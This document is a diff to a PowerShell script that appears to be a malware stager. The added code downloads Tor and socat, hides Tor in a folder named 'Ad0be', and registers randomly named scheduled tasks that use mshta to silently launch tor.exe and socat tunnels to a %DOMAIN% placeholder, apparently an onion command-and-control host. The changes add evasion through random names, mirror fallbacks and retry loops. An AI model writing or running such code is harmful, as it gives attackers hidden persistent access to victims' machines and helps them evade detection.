@@ -54,37 +54,72 @@ $td.Actions.Add($ExecAction);
 $task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
 $task.Run();
 }
+function RandomString{
+    param([int]$min=5, [int]$max=15);
+    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
+}
+function Download {
+    param([string]$url, [string]$file);
+    $ErrorActionPreference = "Stop";
+    try {
+        Start-BitsTransfer -Source $url -Destination $file;
+    }
+    catch {
+        try {
+            (New-Object System.Net.WebClient).DownloadFile($url,$file);
+        }
+        catch {
+            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$url`" `"$file`">nul" -Wait -WindowStyle Hidden;
+        }
+    }finally{
+        $ErrorActionPreference = "Continue";
+    }
+    if ( $(Try { Test-Path $file.trim() } Catch { $false })){
+        return $true;
+    }
+    return $false;
+}
 function ITP{
-$File=$env:Temp+'\ts.zip';
-$Dest=$env:Temp+'\ts';
-(New-Object System.Net.WebClient).DownloadFile('https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg',$File);
-if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
+$File=$env:Temp+'\'+(RandomString)+'.zip';
+$Dest=$env:Temp+'\'+(RandomString);
+while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
+if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}md $Dest | Out-Null;
 Unzip $File $Dest;
 rm -Force $File;
 $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
 $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
-$TFile=$env:Temp+'\t.zip';
-$DestTP=$env:APPDATA+'\MS';
-(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/7.0.5/tor-win32-0.3.0.10.zip',$TFile);
-if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
+$TFile=$env:Temp+'\'+(RandomString)+'.zip'
+$DestTP=$env:APPDATA+'\Ad0be';
+$TorMirrors=@("https://torproject.urown.net/dist/",
+"https://dist.torproject.org/",
+"https://torproject.mirror.metalgamer.eu/dist/",
+"https://tor.ybti.net/dist/");
+foreach ($mirror in $TorMirrors) {
+    $_url=$mirror+'torbrowser/7.0.5/tor-win32-0.3.0.10.zip';
+    if((Download $_url $TFile)){
+        break;
+    }
+}
+if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
 Unzip $TFile $DestTP;
-rm -Force $TFile;
+Remove-Item -Force $TFile;
 $tor=$DestTP+'\Tor\tor.exe';
 $tor=$tor.Replace('\','/');
 $tor_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$tor',0,false))`"";
-AddTask 'SUT' 'mshta.exe' $tor_cmd;
-$SFile=$env:Temp+'\s.zip';
-(New-Object System.Net.WebClient).DownloadFile('https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip',$SFile);
+AddTask (RandomString) 'mshta.exe' $tor_cmd;
+$SFile=$env:Temp+'\'+(RandomString)+'.zip';
+while (!(Download 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
 Unzip $SFile $DestTP;
 $s_old=$DestTP+'\socat-windows-1.7.2.1\';
-rm -Force $SFile;
-Rename-Item -path $s_old -newName 's';
-$s_fold=$DestTP+'\s\';
+$s_new=(RandomString);
+Remove-Item -Force $SFile;
+Rename-Item -path $s_old -newName $s_new;
+$s_fold=$DestTP+'\'+$s_new+'\';
 $s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
 $s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
 $s1_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s1cmd',0,false))`"";
 $s2_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s2cmd',0,false))`"";
-AddTask 'MRT' 'mshta.exe' $s1_cmd 0 0 $s_fold;
-AddTask 'SC' 'mshta.exe' $s2_cmd 0 0 $s_fold;
+AddTask (RandomString) 'mshta.exe' $s1_cmd 0 0 $s_fold;
+AddTask (RandomString) 'mshta.exe' $s2_cmd 0 0 $s_fold;
 }
 ITP
